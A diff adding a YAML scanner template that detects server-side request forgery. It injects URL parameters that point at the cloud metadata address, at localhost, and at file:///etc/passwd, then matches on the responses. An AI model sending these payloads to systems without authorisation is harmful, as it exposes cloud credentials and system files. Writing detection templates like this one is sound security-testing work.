@@ -1,0 +1,40 @@
+id: ssrf-basic
+
+info:
+  name: Server-Side Request Forgery (SSRF) - Basic
+  author: Kalkaneus Team
+  severity: high
+  description: Detects SSRF vulnerabilities
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+  tags: ssrf,injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{Path}}http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}{{Path}}http://localhost"
+      - "{{BaseURL}}{{Path}}http://127.0.0.1"
+      - "{{BaseURL}}{{Path}}http://0.0.0.0"
+      - "{{BaseURL}}{{Path}}file:///etc/passwd"
+    
+    payloads:
+      Path:
+        - "?url="
+        - "?uri="
+        - "?path="
+        - "?dest="
+        - "?redirect="
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+        condition: or
+        
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
